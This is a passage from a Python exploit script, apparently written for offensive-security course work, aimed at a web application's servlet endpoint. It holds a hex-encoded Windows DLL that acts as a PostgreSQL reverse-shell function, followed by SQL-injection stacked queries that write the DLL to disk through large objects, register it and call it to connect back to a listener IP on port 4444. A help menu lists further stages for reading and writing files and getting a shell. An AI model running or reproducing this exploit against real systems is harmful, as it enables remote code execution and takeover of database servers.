1741183e801740533c040eb30e8f2050000eb05e8cc0500000fb6c0eb1fff7510ff7508e81800000059eb10837d10000f95c00fb6c050e8ff000000595dc20c006a106890240010e8630900006a00e8200600005984c0750733c0e9c8000000e8120500008845e3b301885de78365fc00833d603300100074076a07e8ab070000c7056033001001000000e84705000084c0744de8b7080000e854040000e87304000068a420001068a0200010e8440b0000595985c07529e8ef04000084c07420689c2000106898200010e8200b00005959c705603300100200000032db885de7c745fcfeffffffe84400000084db0f8564ffffffe82c0700008bf0833e00741e56e8500600005984c07413ff750c6a02ff75088b368bcee889080000ffd6ff052030001033c040e8c9080000c38a5de7ff75e3e8a806000059c36a0c68b0240010e869080000a12030001085c07f0433c0eb5948a320300010e8180400008845e48365fc00833d603300100274076a07e8b6060000e8c9040000e87e030000e8f607000083256033001000c745fcfeffffffe81b0000006a00ff7508e85c060000595933c984c00f95c18bc1e844080000c3e8af040000ff75e4e82106000059c36a0c68d0240010e8e20700008b7d0c85ff750f393d203000107f0733c0e9d40000008365fc0083ff01740a83ff0274058b5d10eb318b5d105357ff7508e8ba0000008bf08975e485f60f849e0000005357ff7508e8d3fdffff8bf08975e485f60f84870000005357ff7508e89e0200008bf08975e483ff01752285f6751e5350ff7508e8860200005356ff7508e89afdffff5356ff7508e86000000085ff740583ff0375485357ff7508e87dfdffff8bf08975e485f674355357ff7508e83a0000008bf0eb248b4dec8b0151ff30681e110010ff7510ff750cff7508e86e03000083c418c38b65e833f68975e4c745fcfeffffff8bc6e839070000c3558bec568b35c020001085f6750533c040eb12ff75108bceff750cff7508e8c5060000ffd65e5dc20c00558bec837d0c017505e887010000ff7510ff750cff7508e8befeffff83c40c5dc20c00558bec6a00ff1524200010ff7508ff152820001068090400c0ff152020001050ff151c2000105dc3558bec81ec240300006a17e8dd08000085c074056a0259cd29a328310010890d24310010891520310010891d1c310010893518310010893d14310010668c1540310010668c0d34310010668c1d10310010668c050c310010668c2508310010668c2d043100109c8f05383100108b4500a32c3100108b4504a3303100108d4508a33c3100108b85dcfcffffc7057830001001000100a130310010a334300010c70528300010090400c0c7052c30001001000000c70538300010010000006a04586bc000c7803c300010020000006a04586bc0008b0d00300010894c05f86a0458c1e0008b0d04300010894c05f868c4200010e8e1feffff8be55dc3558bec83ec148365f4008d45f48365f80050ff15302000108b45f83345f48945fcff150c2000103145fcff15102000103145fc8d45ec50ff15142000108b45f08d4dfc3345ec3345fc33c18be55dc3a1003000105657bf4ee640bbbe0000ffff3bc7740d85c67409f7d0a304300010eb2ee88affffff8bc83bcf7507b94fe640bbeb0e85ce750a0d11470000c1e0100bc8890d00300010f7d1890d043000105f5ec3558bec837d0c017512833dc0200010007509ff7508ff152c20001033c0405dc20c006848330010ff1504200010c36848330010e8d606000059c3b850330010c3b858330010c3e8efffffff8b4804830804894804e8e7ffffff8b4804830802894804c3558bec8b4508568b483c03c80fb741148d511803d00fb741066bf02803f23bd674198b4d0c3b4a0c720a8b420803420c3bc8720c83c2283bd675ea33c05e5dc38bc2ebf9e85506000085c0750332c0c364a11800000056be643300108b5004eb043bd0741033c08bcaf00fb10e85c075f032c05ec3b0015ec3e82006000085c07407e874040000eb18e80c06000050e83b0600005985c0740332c0c3e834060000b001c36a00e8cf00000084c0590f95c0c3e83c06000084c0750332c0c3e83006000084c07507e827060000ebedb001c3e81d060000e818060000b001c3558bece8b805000085c07518837d0c017512ff75108b4d1450ff7508e874030000ff5514ff751cff7518e8bc05000059595dc3e88805000085c0740c6868330010e8bd05000059c3e8cb05000085c00f84b4050000c36a00e8b805000059e9b2050000558bec837d08007507c6058133001001e8a5030000e89805000084c0750432c05dc3e88b05000084c0750a6a00e88005000059ebe9b0015dc3558bec83ec0c803d80330010007407b001e988000000568b750885f6740583fe01757fe8fc04000085c0742685f675226868330010e8270500005985c0750f6874330010e8180500005985c0744632c0eb4ba1003000108d75f45783e01fbf683300106a20592bc883c8ffd3c83305003000108945f48945f88945fca5a5a5bf743300108945f48945f88d75f48945fca5a5a55fc6058033001001b0015e8be55dc36a05e8d6000000cc6a0868f0240010e84d0200008365fc00b84d5a000066390500000010755da13c00001081b80000001050450000754cb90b01000066398818000010753e8b4508b9000000102bc15051e88efdffff595985c07427837824007c21c745fcfeffffffb001eb1f8b45ec8b0033c98138050000c00f94c18bc1c38b65e8c745fcfeffffff32c0e816020000c3558bece8e803000085c0740f807d0800750933c0b96433001087015dc3558bec803d81330010007406807d0c007512ff7508e80e040000ff7508e8060400005959b0015dc3b890330010c3558bec81ec24030000536a17e8e303000085c074058b4d08cd296a03e8fb000000c70424cc0200008d85dcfcffff6a0050e88203000083c40c89858cfdffff898d88fdffff899584fdffff899d80fdffff89b57cfdffff89bd78fdffff668c95a4fdffff668c8d98fdffff668c9d74fdffff668c8570fdffff668ca56cfdffff668cad68fdffff9c8f859cfdffff8b4504898594fdffff8d45048985a0fdffffc785dcfcffff010001008b40fc6a50898590fdffff8d45a86a0050e8f80200008b450483c40cc745a815000040c745ac010000008945b4ff15002000106a008d58fff7db8d45a88945f88d85dcfcffff1adb8945fcfec3ff15242000108d45f850ff152820001085c0750c84db75086a03e806000000595b8be55dc383258433001000c35356be80240010bb802400103bf37318578b3e85ff74098bcfe838000000ffd783c6043bf372ea5f5e5bc35356be88240010bb882400103bf37318578b3e85ff74098bcfe80d000000ffd783c6043bf372ea5f5e5bc3ff2594200010cccccccc683b1b001064ff35000000008b442410896c24108d6c24102be0535657a1003000103145fc33c5508965e8ff75f88b45fcc745fcfeffffff8945f88d45f064a300000000f2c38b4df064890d00000000595f5f5e5b8be55d51f2c3558becff7514ff7510ff750cff7508680d1100106800300010e8c101000083c4185dc3558bec8325883300100083ec245333db43091d103000106a0ae8d401000085c00f84720100008365f00033c0830d103000100233c95657891d883300108d7ddc530fa28bf35b8907897704894f0833c989570c8b45dc8b7de08945f481f747656e758b45e835696e65498945f88b45e4356e74656c8945fc33c040530fa28bf35b8d5ddc89038b45fc0b45f80bc7897304894b0889530c75438b45dc25f03fff0f3dc006010074233d60060200741c3d7006020074153d50060300740e3d6006030074073d7006030075118b3d8c33001083cf01893d8c330010eb068b3d8c330010837df4078b45e48945fc7c326a075833c9530fa28bf35b8d5ddc89038b45fc897304894b0889530c8b5de0f7c300020000740e83cf02893d8c330010eb038b5df05f5ea900001000746c830d1030001004c7058833001002000000a9000000087454a900000010744d33c90f01d08945ec8955f08b45ec8b4df083e00633c983f806753285c9752ea11030001083c808c7058833001003000000a310300010f6c320741283c820c7058833001005000000a31030001033c05b8be55dc333c040c333c03905143000100f95c0c3c3ff2540200010ff2538200010ff253c200010ff2568200010ff2564200010ff2560200010ff257c200010ff2574200010ff2570200010ff256c200010ff2578200010ff2518200010b001c333c0c300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005829000042290000e2260000f6280000e0280000c6280000aa28000096280000822800006428000048280000262900000c290000000000004a270000542700002a2700000000000009000080102700000b0000807300008002270000000000009a2700008c2700008027000004280000e8270000c62700001c280000ac27000000000000ba260000b02600009c260000000000000d1d001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002830001078300010636d642e65786500010000001c000000860300006400000020000000400000000100000000000000000000000000000000000000000000003ccea5660000000002000000520000001422000014140000000000003ccea566000000000c000000140000006822000068140000000000003ccea566000000000d000000000200007c2200007c140000000000003ccea566000000000e000000000000000000000000000000980000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000101022001001000000942000100000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b1b00005253445380888521e9050b45bd02c19a338c3c0d01000000433a5c55736572735c41646d696e6973747261746f725c736f757263655c7265706f735c617761655c52656c656173655c617761652e70646200000000000000160000001600000001000000150000004743544c001000005c0d00002e74657874246d6e0000000000200000940000002e696461746124350000000094200000040000002e3030636667000098200000040000002e43525424584341000000009c200000040000002e4352542458435a00000000a0200000040000002e4352542458494100000000a4200000040000002e4352542458495a00000000a8200000040000002e4352542458504100000000ac200000040000002e4352542458505a00000000b0200000040000002e4352542458544100000000b42000000c0000002e4352542458545a00000000c0200000500100002e7264617461000010220000040000002e72646174612473786461746100000014220000680200002e7264617461247a7a7a6462670000007c240000040000002e727463244941410000000080240000040000002e72746324495a5a0000000084240000040000002e727463245441410000000088240000080000002e72746324545a5a0000000090240000800000002e786461746124780000000010250000800000002e6564617461000090250000640000002e6964617461243200000000f4250000140000002e696461746124330000000008260000940000002e69646174612434000000009c260000d00200002e696461746124360000000000300000200000002e6461746100000020300000a00500002e627373000000000000000000000000000000000000000000000000feffffff00000000d0ffffff00000000feffffff000000005e12001000000000feffffff00000000d4ffffff00000000feffffff00000000e312001000000000feffffff00000000d4ffffff00000000feffffffb8130010d713001000000000feffffff00000000d8ffffff00000000feffffffec180010ff1800100000000000000000ffffffff00000000562500000100000003000000030000003825000044250000502500000010000020100000101000005f2500006d2500007a250000000001000200617761652e646c6c0050675f6d616769635f66756e6300636f6e6e6563745f6261636b0070675f66696e666f5f636f6e6e6563745f6261636b008c2600000000000000000000d426000084200000082600000000000000000000f4260000002000005026000000000000000000001e270000482000004026000000000000000000006e27000038200000682600000000000000000000262800006020000000000000000000000000000000000000000000005829000042290000e2260000f6280000e0280000c6280000aa28000096280000822800006428000048280000262900000c290000000000004a270000542700002a2700000000000009000080102700000b0000807300008002270000000000009a2700008c2700008027000004280000e8270000c62700001c280000ac27000000000000ba260000b02600009c260000000000009a1370675f6465746f6173745f646174756d00000118746578746f757400dd0144697265637446756e6374696f6e43616c6c31436f6c6c00706f7374677265732e6578650000df0043726561746550726f636573734100004b45524e454c33322e646c6c00005600575341536f636b65744100002000575341436f6e6e65637400005753325f33322e646c6c000025005f5f7374645f747970655f696e666f5f64657374726f795f6c697374000048006d656d736574000035005f6578636570745f68616e646c6572345f636f6d6d6f6e00564352554e54494d453134302e646c6c000038005f696e69747465726d0039005f696e69747465726d5f650041005f7365685f66696c7465725f646c6c0019005f636f6e6669677572655f6e6172726f775f61726776000035005f696e697469616c697a655f6e6172726f775f656e7669726f6e6d656e74000036005f696e697469616c697a655f6f6e657869745f7461626c65000024005f657865637574655f6f6e657869745f7461626c650017005f636578697400006170692d6d732d77696e2d6372742d72756e74696d652d6c312d312d302e646c6c00a505556e68616e646c6564457863657074696f6e46696c74657200006505536574556e68616e646c6564457863657074696f6e46696c74657200150247657443757272656e7450726f636573730084055465726d696e61746550726f6365737300008103497350726f636573736f724665617475726550726573656e740046045175657279506572666f726d616e6365436f756e74657200160247657443757272656e7450726f636573734964001a0247657443757272656e7454687265616449640000e50247657453797374656d54696d65417346696c6554696d65001c0144697361626c655468726561644c69627261727943616c6c73005e03496e697469616c697a65534c69737448656164007a034973446562756767657250726573656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004ee640bbb119bf44ffffffff0000000001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000003c010000013011302530303042304a305530603066306f3078307e30883097309d30a230a830b130bb30c430ce30d730dc30e130f230f930fe3004310f317431a331b331d431d931f231f731043251326e32783286329832b732f5320733c133f43342344b3456345d347d34833489348f3495349b34a234a934b034b734be34c534cc34d434dc34e434f034f934fe3404350e3518352835383548355135723581358a359735ae35c935f135f9350b361736233629362f363b364136bb367e37af37e5370e381d3830383c384c385d3873388a389f38a638ac38be38c838263933395739353a553a5f3a7a3a833a883aae3ab33ad83ae13afe3a4b3b503b633b713b8c3b973b2b3c343c3c3c783c8c3c933cc93cd23cdb3ce93cf23c053d103d163d1c3d223d283d2e3d343d3a3d403d463d4c3d523d000000200000200000009430c430c830ac31b031b831a834c834e434e834043508350000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    loid = 1337

    print("[+] Deleting existing LO...")
    query = "1; SELECT lo_unlink({});--+".format(str(loid))
    make_request(ip, query)

    print("[+] Creating LO...")
    query = "1; SELECT lo_import('C:\\windows\\win.ini',{});--+".format(str(loid))
    make_request(ip, query)

    print("[+] Injecting UDF payload of length {} into LO...".format(str(len(udf))))
    chunk_size = 4096
    for i in range(0,round(((len(udf)-1)/chunk_size))+1):
         udf_chunk = udf[i*chunk_size:(i+1)*chunk_size]
         if i == 0:
             query = "1; UPDATE PG_LARGEOBJECT SET data=decode('{}', 'hex') where loid={} and pageno={};--+".format(udf_chunk, str(loid), str(i))
         else:
             query = "1; INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({}, {}, decode('{}', 'hex'));--+".format(str(loid), str(i), udf_chunk)
         make_request(ip, query)

    print("[+] Exporting UDF library to filesystem...")
    query = "1; SELECT lo_export({}, 'C:\\Users\\Public\\rev_shell.dll');--+".format(str(loid))
    make_request(ip, query)

    print("[+] Creating function...")
    query = "1; create or replace function rev_shell(text, integer) returns VOID as 'C:\\Users\\Public\\rev_shell.dll', 'connect_back' language C strict;--+"
    make_request(ip, query)

    print("[+] Launching reverse shell...")
    query = "1; select rev_shell('192.168.45.232', 4444);--+"
    make_request(ip, query)

def make_request(ip, query):
    query = parse_query(query)
    params = {
        "ForMasRange": "1",
        "userId": query
    }
    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    r = requests.get(url, params=params, proxies=proxies, verify=False)

class NewlineFormatter(argparse.RawTextHelpFormatter):
    def _split_lines(self, text, width):
        if text.startswith('R|'):
            return text[2:].splitlines()  
        return argparse.RawTextHelpFormatter._split_lines(self, text, width)

def main():
    parser = argparse.ArgumentParser(description='''
    Usage examples:
      - To check if the application is vulnerable:
        python script.py -i <IP> -s verify
      - To check if the current user is a DBA:
        python script.py -i <IP> -s check_dbuser
      - To get a reverse shell:
        python script.py -i <IP> -s reverse_shell -l <Listener IP>

    The script supports the following stages:
      - "verify": Verify if the application is vulnerable.
      - "check_superuser": Get the SQL version of the application.
      - "read_file": A PoC to read the first character of a file.
      - "write_file": Copy a file to the file system.
      - "copy_to_reverse_shell": Obtain reverse shell by overwriting a vbs script that is periodically executed. The overwrite is done through COPY TO.
      - "udf_reverse_shell": Obtain reverse shell by loading a reverse shell UDF remotely through SMB.
      - "copy_udf_reverse_shell": Copy the reverse shell UDF through large object methods and execute it.
    ''', formatter_class=NewlineFormatter)
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP Address is mandatory')
    parser.add_argument('-s', '--stage', type=str, help='Stage')
    parser.add_argument('-l', '--listener', type=str, help='Listener IP')
    args = parser.parse_args()
    
    if not args.ip:
        parser.print_usage()
        exit(1)

    elif args.ip and args.stage:
        ip = args.ip
        stage = args.stage
        
        if stage == "verify":
            verify(ip)
        
        elif stage == "check_dbuser":
            check_dbuser(ip)

        elif stage == "read_file":
            read_file(ip)

        elif stage == "write_file":
            write_file(ip)

        elif stage == "copy_to_reverse_shell":
            copy_to_reverse_shell(ip)

        elif stage == "udf_reverse_shell":
            udf_reverse_shell(ip)

        elif stage == "copy_udf_reverse_shell":
            copy_udf_reverse_shell(ip)

    else:
        verify(ip)
    

if __name__ == "__main__":
    main()
